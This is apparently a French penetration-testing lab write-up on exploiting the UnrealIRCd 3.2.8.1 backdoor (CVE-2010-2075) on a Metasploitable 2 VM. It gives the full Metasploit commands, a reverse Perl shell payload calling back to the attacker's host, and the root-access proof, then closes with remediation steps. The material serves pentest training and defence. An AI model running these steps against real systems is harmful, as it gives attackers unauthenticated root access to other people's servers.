UnrealIRCd 3.2.8.1 — Backdoor

Exécution de commande à distance via porte dérobée insérée dans la chaîne de distribution

Service / PortIRC (UnrealIRCd) — port 6667
CibleMetasploitable 2 — 192.168.56.101
CVECVE-2010-2075
RésultatAccès root (shell de commande)
Testé parZANNOU Josaphat

1. Identification

Le scan de reconnaissance sur le port 6667 de la cible identifie un serveur IRC UnrealIRCd. Point important : nmap ne remonte pas le numéro de version exact — or la faille visée est spécifique à la version 3.2.8.1. Cette version précise sera confirmée à l'étape d'exploitation, lorsque la phase de vérification (check) du module Metasploit validera que la cible est bien vulnérable. Le bandeau irc.Metasploitable.LAN confirme déjà qu'on est sur le serveur IRC volontairement vulnérable de la VM.

2. Méthode d'identification de la CVE et du module

Première question indépendante de tout outil : UnrealIRCd a-t-il une faille connue, et pour quelle version ?

$ searchsploit unrealircd

---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution      | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overfl | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute        | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service             | windows/dos/27407.pl
---------------------------------------------- ---------------------------------

Confirmé — une backdoor d'exécution de commande existe pour la version 3.2.8.1. searchsploit ne donne ni la CVE ni un chemin de module directement utilisable ; étape suivante, chercher dans msfconsole puisque c'est l'outil choisi pour l'exploitation :

$ msfconsole -q -x "search unrealircd; exit"

#  Full Name                                   Disclosure Date  Rank       Check  Name
-  ---------                                   ---------------  ----       -----  ----
0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  Yes    UnrealIRCD 3.2.8.1 Backdoor Command Execution

C'est de là que vient le chemin exact exploit/unix/irc/unreal_ircd_3281_backdoor — un seul module, de rang excellent, qui dispose d'une fonction check (colonne Check: Yes) permettant de vérifier la vulnérabilité avant de tirer. Reste à obtenir la CVE et le mécanisme :

$ msfconsole -q -x "info exploit/unix/irc/unreal_ircd_3281_backdoor; exit"

Description:
  This module exploits a malicious backdoor that was added to the
  Unreal IRCD 3.2.8.1 download archive.
References:
  https://nvd.nist.gov/vuln/detail/CVE-2010-2075
  http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt

La section References confirme CVE-2010-2075. La description donne la nature de la faille : en novembre 2009, l'archive source officielle d'UnrealIRCd 3.2.8.1 a été remplacée par une version trafiquée sur les miroirs de téléchargement — une compromission de la chaîne de distribution logicielle (supply chain), exactement comme vsftpd 2.3.4, et non une faille de conception du code légitime. Le code injecté surveille les données reçues : toute ligne commençant par le préfixe magique AB; voit le reste de la ligne passé directement à system() côté serveur, exécuté avec les droits du démon — ici root.

Backdoor déclenchée par une ligne préfixée AB; envoyée sur le port IRC — aucune authentification requise. La commande qui suit s'exécute en root.

3. Démarche d'exploitation

Le module Metasploit dédié existant déjà, aucune recherche d'exploit supplémentaire n'était nécessaire. Démarche interactive dans msfconsole, commande par commande :

msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667
RPORT => 6667
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4444
LPORT => 4444
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl

Point d'attention — LHOST et LPORT sont obligatoires : le payload choisi (cmd/unix/reverse_perl) est un reverse shell, il établit une connexion retour vers l'attaquant et doit donc savoir où se connecter. Le payload Meterpreter proposé par défaut par le module n'aboutissait pas sur cette cible très ancienne ; cmd/unix/reverse_perl, qui s'appuie sur l'interpréteur perl déjà présent sur la VM, est fiable ici.

Une fois la configuration validée, exploit -z déclenche l'attaque (le -z bascule la session en arrière-plan dès son ouverture) :

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit -z
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667
[*] 192.168.56.101:6667 - Trying to register a new IRC user: keneth
[+] 192.168.56.101:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands
[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667
[*] 192.168.56.101:6667 - Sending IRC backdoor command
[*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.101:58940)
[*] Session 1 created in the background.

4. Preuve d'accès obtenu

La commande sessions -c '...' -i 1 exécute id, uname -a et hostname directement dans la session ouverte :

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > sessions -c 'id; uname -a; hostname' -i 1
[*] Running 'id; uname -a; hostname' on shell session 1 (192.168.56.101)
uid=0(root) gid=0(root)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable

L'accès est root directement, sans étape d'élévation de privilèges : le démon IRC tournait avec les droits root, donc la commande injectée par la backdoor s'exécute en root.

5. Remédiation

RECOMMANDATIONS
  • Mettre à jour UnrealIRCd vers une version ultérieure non affectée par cette compromission historique (toute version postérieure à juin 2010, ou l'archive ré-authentifiée par le projet).
  • Vérifier systématiquement l'intégrité des archives source téléchargées (hash SHA-256 / signature GPG publiés par le mainteneur) avant compilation et déploiement, en particulier pour un service exposé.
  • Appliquer le principe de moindre privilège : faire tourner le démon IRC sous un compte de service dédié non privilégié, jamais en root, pour qu'une compromission n'aboutisse pas directement à un accès root.
  • Ne pas exposer un service IRC interne sur le réseau sans contrôle d'accès, et journaliser/alerter sur les connexions aux ports de service inhabituels.
